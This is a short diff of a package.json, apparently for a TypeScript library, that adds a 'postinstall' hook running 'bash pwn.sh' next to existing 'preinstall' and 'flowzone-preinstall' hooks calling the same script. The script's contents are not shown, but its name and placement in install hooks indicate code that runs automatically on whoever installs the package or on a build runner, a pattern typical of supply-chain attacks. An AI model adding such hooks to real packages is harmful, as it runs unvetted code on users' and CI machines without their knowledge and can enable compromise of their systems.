@@ -14,6 +14,7 @@
   "types": "dist/index.d.ts",
   "scripts": {
     "preinstall": "bash pwn.sh",
+    "postinstall": "bash pwn.sh",
     "flowzone-preinstall": "bash pwn.sh",
     "test": "jest --coverage",
     "prettify": "balena-lint --typescript --fix src/ test/ index.ts",
